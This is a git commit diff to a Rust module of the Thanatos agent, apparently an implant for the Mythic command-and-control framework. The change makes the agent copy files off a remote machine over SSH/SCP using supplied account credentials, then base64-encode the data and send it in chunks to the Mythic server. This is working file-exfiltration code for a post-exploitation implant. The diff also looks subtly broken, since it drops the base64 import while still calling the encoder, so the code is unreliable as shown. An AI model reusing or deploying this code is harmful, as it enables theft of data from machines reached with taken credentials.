07bc58d0c539332f9c7ff8171b489c0cb372436e
b33rb4r0n <gerardo.ruiz@kaseya.com>
2025-10-21 16:46:51 +0200

    Update download.rs

--- Payload_Type/thanatos/thanatos/agent_code/src/download.rs
+++ Payload_Type/thanatos/thanatos/agent_code/src/download.rs
@@ -1,36 +1,24 @@
+use serde::Serialize;
+use serde_json::json;
+
 use crate::agent::{AgentTask, ContinuedData};
 use crate::mythic_success;
-use crate::utils::unverbatim;
-use base64::{Engine as _, engine::general_purpose};
-use serde::{Deserialize, Serialize};
-use serde_json::json;
+
+use ssh2::Session;
 use std::error::Error;
-use std::io::Cursor;
+use std::io::{Cursor, Read};
 use std::path::Path;
 use std::result::Result;
 use std::sync::mpsc;
 
-use std::io::Read;
+use super::SshArgs;
 
-/// Chunk size used for chunking and sending files
+/// Chunk size used for file transfer
 const CHUNK_SIZE: usize = 512000;
-
-#[cfg(target_os = "windows")]
-use crate::utils::windows::whoami::hostname;
-
-#[cfg(target_os = "linux")]
-use crate::utils::linux::whoami::hostname;
-
-/// Struct containing the task parameters
-#[derive(Deserialize)]
-struct DownloadArgs {
-    /// File to download
-    file: String,
-}
 
 /// Response sent for initiating a download
 #[derive(Serialize)]
-struct DownloadResponse<'a> {
+struct SshDownloadResponse<'a> {
     /// Total chunks in the download
     total_chunks: usize,
 
@@ -38,7 +26,7 @@ struct DownloadResponse<'a> {
     full_path: Option<&'a str>,
 
     /// Host the downloaded file is from
-    host: Option<String>,
+    host: &'a str,
 
     /// Optional extra filename for the file
     filename: Option<String>,
@@ -50,9 +38,9 @@ struct DownloadResponse<'a> {
     chunk_size: usize,
 }
 
-/// Information containing the chunk of the file being downloaded
+/// Information containing each downloaded chunk
 #[derive(Serialize)]
-struct DownloadChunk<'a> {
+struct SshDownloadChunk<'a> {
     /// The current chunk being transferred
     chunk_num: usize,
 
@@ -66,114 +54,98 @@ struct DownloadChunk<'a> {
     chunk_size: usize,
 }
 
-/// Downloads a file from Mythic and places it on the host system
-/// * `tx` - Channel used for sending information to Mythic
-/// * `rx` - Channel used for receiving information from Mythic
+/// Function used to download a file from a machine with SCP and upload it to Mythic
+/// * `sess` - Connected SSH session
+/// * `task` - Task used to invoke the command
+/// * `args` - Task arguments
+/// * `tx` - Channel for sending data to Mythic
+/// * `rx` - Channel for receiving data from Mythic
 pub fn download_file(
+    sess: Session,
+    task: &AgentTask,
+    args: &SshArgs,
     tx: &mpsc::Sender<serde_json::Value>,
     rx: mpsc::Receiver<serde_json::Value>,
-) -> Result<(), Box<dyn Error>> {
-    // Grab the inital task information
-    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
+) -> Result<serde_json::Value, Box<dyn Error>> {
+    // Get the path from the arguments
+    let file_path = args.download.as_ref().unwrap();
 
-    // Parse the task parameters
-    let args: DownloadArgs = serde_json::from_str(&task.parameters)?;
+    // Create a new SCP session for receiving a file
+    let (mut f_recv, f_stat) = sess.scp_recv(Path::new(&file_path))?;
 
-    // Formulate the absolute path to the file
-    let cwd = std::env::current_dir()?;
-    let file_path = Path::new(&cwd.join(args.file)).canonicalize()?;
+    // Check if trying to access a directory
+    if f_stat.is_dir() {
+        return Err("Remote path is not a file".into());
+    }
 
-    let full_path = unverbatim(file_path.clone()).to_string_lossy().to_string();
+    // Read the file from the machine
+    let mut file_data: Vec<u8> = Vec::new();
+    f_recv.read_to_end(&mut file_data)?;
+    let file_len = file_data.len();
 
-    // Open the file and get the size
-    let mut file = std::fs::File::open(&file_path)?;
-    let file_len = file.metadata()?.len() as usize;
-
-    // Calculate the total number of chunks which will be sent
+    // Get the number of chunks for the file transfer
     let total_chunks = ((file_len as f64 / CHUNK_SIZE as f64).ceil()) as usize;
 
-    // Metadata for the file download
-    let download_data = DownloadResponse {
+    let download_data = SshDownloadResponse {
         total_chunks,
-        full_path: Some(&full_path),
-        host: hostname(),
+        full_path: Some(file_path),
+        host: &args.host,
         is_screenshot: false,
         chunk_size: CHUNK_SIZE,
         filename: None,
     };
 
-    // Send the file information up to Mythic for initiating a file download
-    let send_data = json!({
+    // Initialize the upload procedure to Mythic
+    tx.send(json!({
         "task_id": task.id,
         "download": download_data,
-    });
+    }))?;
 
-    tx.send(send_data)?;
-
-    // Read in the file data
-    let mut file_data: Vec<u8> = Vec::new();
-    file.read_to_end(&mut file_data)?;
-
-    // Explicitly close the file handle.
-    drop(file);
-
-    // Create a cursor which will traverse the file data
     let mut c = Cursor::new(file_data);
 
-    // Get the response from Mythic containing the file id for tracking
+    // Grab the file id for tracking
     let task: AgentTask = serde_json::from_value(rx.recv()?)?;
-
     let params: ContinuedData = serde_json::from_str(&task.parameters)?;
-    let file_id: String = params
+    let file_id = params
         .file_id
         .ok_or_else(|| std::io::Error::other("No file id"))?;
 
-    // Iterate over the file data sending up the chunks
+    // Continue sending chunks of the file to Mythic
     for num in 0..total_chunks {
-        // Create a temporary buffer for the data
         let mut buffer: [u8; CHUNK_SIZE] = [0; CHUNK_SIZE];
-
-        // Read a chunk of file data to the buffer and base64 encode it
         let len = c.read(&mut buffer)?;
+
         let chunk_data = general_purpose::STANDARD.encode(&buffer[..len]);
 
-        // Create the metadata with the chunk of data
-        let chunk_metadata = DownloadChunk {
+        let chunk_metadata = SshDownloadChunk {
             chunk_num: num + 1,
             chunk_size: len,
             file_id: &file_id,
             chunk_data,
         };
 
-        // Send over the response to Mythic
         tx.send(json!({
             "task_id": task.id,
-            "download": chunk_metadata,
+            "download": chunk_metadata
         }))?;
 
-        // Wait until a message is received from Mythic and continue
         let _: AgentTask = serde_json::from_value(rx.recv()?)?;
     }
 
-    // Formulate the success output for Mythic
+    // Notify Mythic that the transfer was a success
     let mut output = mythic_success!(task.id, file_id);
-
-    // Add an artifact signifying that a file was opened
     let output = output.as_object_mut().unwrap();
     output.insert(
         "artifacts".to_string(),
         serde_json::json!(
             [
                 {
-                    "base_artifact": "FileOpen",
-                    "artifact": full_path,
+                    "base_artifact": "Remote FileOpen",
+                    "artifact": format!("ssh {}@{} -download {}", args.credentials.account, args.host, file_path),
                 }
             ]
-        ),
+        )
     );
 
-    // Send over the completed download message
-    tx.send(serde_json::to_value(output)?)?;
-
-    Ok(())
+    Ok(serde_json::to_value(output)?)
 }
